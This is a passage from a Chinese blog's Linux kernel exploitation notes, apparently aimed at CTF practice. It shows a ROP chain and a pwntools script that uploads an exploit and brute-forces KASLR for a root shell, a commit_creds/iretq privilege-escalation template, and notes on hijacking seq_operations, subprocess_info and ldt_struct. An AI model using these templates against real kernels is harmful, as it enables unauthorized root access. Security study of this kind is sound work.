          <a href="#1-POC里" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-POC里" class="headerlink" title="(1)POC里"></a>(1)POC里</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ROP[i++] = POP_RDI_RET + offset;</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">ROP[i++] = COMMIT_CREDS + offset;</span><br><span class="line">ROP[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-打远程的EXP"   >
          <a href="#2-打远程的EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打远程的EXP" class="headerlink" title="(2)打远程的EXP"></a>(2)打远程的EXP</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line">    </span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="5-retUsr模板"   >
          <a href="#5-retUsr模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-retUsr模板" class="headerlink" title="5.retUsr模板"></a>5.retUsr模板</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">void</span> * rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));    <span class="comment">// 保存状态的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">status</span>;</span>     <span class="comment">// 保存状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将状态保存在status中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span>                  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %%ss, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rsp, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%cs, %3\n&quot;</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(status.ss),<span class="string">&quot;=r&quot;</span>(status.rsp),<span class="string">&quot;=r&quot;</span>(status.rflags),<span class="string">&quot;=r&quot;</span>(status.cs)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">&quot;memory&quot;</span></span><br><span class="line">        );</span><br><span class="line">    status.rip = shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retUsr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $status,%rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq&quot;</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="九、常见可利用结构体"   >
          <a href="#九、常见可利用结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、常见可利用结构体" class="headerlink" title="九、常见可利用结构体"></a>九、常见可利用结构体</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x01-tty-%E7%B3%BB%E5%88%97%E7%BB%93%E6%9E%84%E4%BD%93" >【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-tty系列结构体—kmalloc-1024"   >
          <a href="#1-tty系列结构体—kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-tty系列结构体—kmalloc-1024" class="headerlink" title="1.tty系列结构体—kmalloc-1024"></a>1.tty系列结构体—kmalloc-1024</h2>
      <p>打开设备：<code>/dev/ptmx</code></p>
<p>tty_struct 的魔数为 <code>0x5401</code>，位于该结构体的开头，我们可以利用对该魔数的搜索以锁定该结构体。</p>
<p>上面<strong>堆-&gt;借助ptmx设备</strong>讲过了</p>

        <h2 id="2-seq-operations结构体—-kmalloc-32"   >
          <a href="#2-seq-operations结构体—-kmalloc-32" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-seq-operations结构体—-kmalloc-32" class="headerlink" title="2.seq_operations结构体—-kmalloc-32"></a>2.seq_operations结构体—-kmalloc-32</h2>
      <p>打开设备：<code>proc/self/stat</code></p>
<p>该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，大小为0x20</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">	<span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>通过函数指针泄露地址，再劫持start函数指针后对该设备进行读写即可调用劫持的start函数指针，控制程序流程。读写的时候可通过syscall创建<code>pt_regs</code>结构体来布置内核栈环境，然后通过<code>swapgs_restore_regs_and_return_to_usermode</code>函数返回用户空间。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >西湖论剑2021线上初赛easykernel题解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="3-subprocess-info结构体—kmalloc-128"   >
          <a href="#3-subprocess-info结构体—kmalloc-128" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-subprocess-info结构体—kmalloc-128" class="headerlink" title="3.subprocess_info结构体—kmalloc-128"></a>3.subprocess_info结构体—kmalloc-128</h2>
      <p>通过以下语句可以分配得到一个<code>subprocess_info</code>结构体，不同版本大小不同，如下版本形式的为0x60，使用kmalloc-128分配器</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>

<p>结构体</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">char</span> **argv;</span><br><span class="line">    <span class="keyword">char</span> **envp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>

<p>该结构体在分配时最终会调用其中的<code>void (*cleanup)(struct subprocess_info *info);</code>函数指针，所以如果存在一个UAF和条件竞争，在分配时启动另一个线程不断修改该函数指针，那么就能劫持程序流，再利用一些gadget就可以控制得到。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264563#h2-2" >SCTF flying_kernel 出题总结 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="4-ldt-struct结构体—kmalloc-16"   >
          <a href="#4-ldt-struct结构体—kmalloc-16" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ldt-struct结构体—kmalloc-16" class="headerlink" title="4.ldt_struct结构体—kmalloc-16"></a>4.ldt_struct结构体—kmalloc-16</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266897#h3-5" >在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs 通用内核ROP解法 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-前置知识"   >
          <a href="#1-前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置知识" class="headerlink" title="(1)前置知识"></a>(1)前置知识</h3>
      
        <h4 id="结构体"   >
          <a href="#结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4>
      <p><code>ldt</code>是即局部段描述符表（Local Descriptor Table），存放着进程的段描述符，在内核中有结构体<code>ldt_struct</code>与之对应。大小为0x10。</p>
<p>如下结构体</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/include/asm/mmu_context.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">	 * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">	 * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">	 * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		nr_entries;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">	 * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">	 * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">	 * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">	 * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>该结构体可以通过系统调用<code>SYS_modify_ldt</code>来操控，想要调用该系统调用号需要编译时开启如下设置，不过一般都是默认开启的，从v4.3版本才开始较为正式的一个编译设置</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_MODIFY_LDT_SYSCALL=y</span><br></pre></td></tr></table></div></figure>


        <h4 id="系统调用函数"   >
          <a href="#系统调用函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#系统调用函数" class="headerlink" title="系统调用函数"></a>系统调用函数</h4>
      <p>具体的函数调用如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/kernel/ldt.c</span></span><br><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount);<span class="comment">//读取</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>);<span class="comment">//写入</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">	 * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">	 * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">	 * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">	 * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">	 * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">	 * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>也就是传入syscall相关参数，会调用不同函数，0对应<code>read_ldt</code>，1对应<code>write_ldt</code>(其实0x11的也差不多，就是<code>oldmode</code>设置为0了而已，具体的还得依据源码进行分析)，依此看代码类似如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//read_ldt从ldt_struct-&gt;entries读取8字节给buf</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//write_ldt依据传入的buf数据和 sizeof(desc)创建一个新的ldt_struct结构体</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;buf, <span class="keyword">sizeof</span>(buf));</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-实现任意读取"   >
          <a href="#2-实现任意读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-实现任意读取" class="headerlink" title="(2)实现任意读取"></a>(2)实现任意读取</h3>
      <p>主要看<code>write_ldt</code>和<code>read_ldt</code>函数，由于调用<code>write_ldt</code>函数时，会创建一个新的<code>ldt_struct</code>一些和利用无关的代码就先省略了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/kernel/ldt.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.........//</span></span><br><span class="line">    <span class="comment">//从用户数据拷贝sizeof(ldt_info)数据给ldt_info</span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//.........//</span></span><br><span class="line">    <span class="comment">//依据一些条件来进行处理</span></span><br><span class="line">	<span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">	    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">		<span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">		<span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//seg_32bit最好直接设置为1,不设置其实也不会进去啦,</span></span><br><span class="line">        <span class="comment">//allow_16bit_segments基本都会返回true</span></span><br><span class="line">		<span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">			error = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static bool allow_16bit_segments(void)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	if (!IS_ENABLED(CONFIG_X86_16BIT))</span></span><br><span class="line"><span class="comment">		return false;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#ifdef CONFIG_XEN_PV</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	 * Xen PV does not implement ESPFIX64, which means that 16-bit</span></span><br><span class="line"><span class="comment">	 * segments will not work correctly.  Until either Xen PV implements</span></span><br><span class="line"><span class="comment">	 * ESPFIX64 and can signal this fact to the guest or unless someone</span></span><br><span class="line"><span class="comment">	 * provides compelling evidence that allowing broken 16-bit segments</span></span><br><span class="line"><span class="comment">	 * is worthwhile, disallow 16-bit segments under Xen PV.</span></span><br><span class="line"><span class="comment">	if (xen_pv_domain()) &#123;</span></span><br><span class="line"><span class="comment">		pr_info_once(&quot;Warning: 16-bit segments do not work correctly in a Xen PV guest\n&quot;);</span></span><br><span class="line"><span class="comment">		return false;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	return true;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		<span class="comment">//一些相关的设置,会导致ldt里的数据被更改</span></span><br><span class="line">		fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">		<span class="keyword">if</span> (oldmode)</span><br><span class="line">			ldt.avl = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static inline void fill_ldt(struct desc_struct *desc, const struct user_desc *info)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	desc-&gt;limit0		= info-&gt;limit &amp; 0x0ffff;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;base0		= 